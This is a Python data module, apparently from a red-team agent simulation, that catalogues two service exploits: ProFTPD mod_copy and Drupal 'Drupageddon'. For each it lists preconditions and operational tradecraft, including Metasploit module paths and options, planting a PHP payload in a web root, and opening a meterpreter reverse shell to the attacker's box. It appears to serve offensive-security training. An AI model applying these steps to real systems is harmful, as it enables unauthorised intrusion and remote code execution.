"""Red-side service-exploit capability catalog.

Standalone data module: back-fills the hand-written service-exploit tradecraft
in ``agents.RED_EARNED_ADDENDUM`` as structured entries. Not yet wired into
doctrine generation — this round only proves the schema with the ProFTPD entry.
"""

from dataclasses import dataclass


@dataclass(frozen=True)
class ServiceCapability:
    service_pattern: str  # what red's own fingerprint/banner output should match
    msf_module: str  # exact Metasploit module path
    preconditions: str  # what must already hold before the module applies
    tradecraft_notes: str  # how to use it; NOT an assertion the vuln is present


CAPABILITY_CATALOG: list[ServiceCapability] = [
    ServiceCapability(
        service_pattern="ProFTPD",
        msf_module="exploit/unix/ftp/proftpd_modcopy_exec",
        preconditions=(
            "Banner must identify the daemon as ProFTPD (fingerprint it yourself, "
            "never assume from an open port 21), AND you must already hold a "
            "credential cracked earlier this episode: the module's SITE CPFR/CPTO "
            "copy needs an authenticated session, so it is a non-starter without one."
        ),
        tradecraft_notes=(
            "Drive msfconsole non-interactively via run_on_attacker; set FTPUSER/"
            "FTPPASS to the exact held credential and SITEPATH to the target web "
            "root (the module copies a PHP payload there, then reaches it over "
            "HTTP). msf's success banner is not proof — verify real execution by "
            "requesting the planted page with a command and confirming the "
            "command's output returns in the HTTP response."
        ),
    ),
    ServiceCapability(
        service_pattern="Drupal",
        msf_module="exploit/multi/http/drupal_drupageddon",
        preconditions=(
            "Fingerprint Drupal yourself from recon (CHANGELOG.txt, a sites/default "
            "tree, /user/login, or a Drupal-looking listing) and READ its version "
            "off the box, AND confirm it is a vulnerable Drupal 7.x (7.0-7.31, fixed "
            "in 7.32). Never assume the version."
        ),
        tradecraft_notes=(
            "Drive msfconsole non-interactively via run_on_attacker with RHOSTS, "
            "TARGETURI set to the path your own listing showed Drupal served from "
            "(never a hardcoded guess), PAYLOAD php/meterpreter/reverse_tcp, and "
            "LHOST set to your own attacker-box IP (determine it yourself in the "
            "same command, e.g. `hostname -I`). `run -z` backgrounds the session "
            "the instant it opens; `sessions -i 1 -c id` in the same command then "
            "runs a real command and returns its output directly. That returned "
            "`uid=...` output is the RCE proof — a session merely opening is not."
        ),
    ),
]
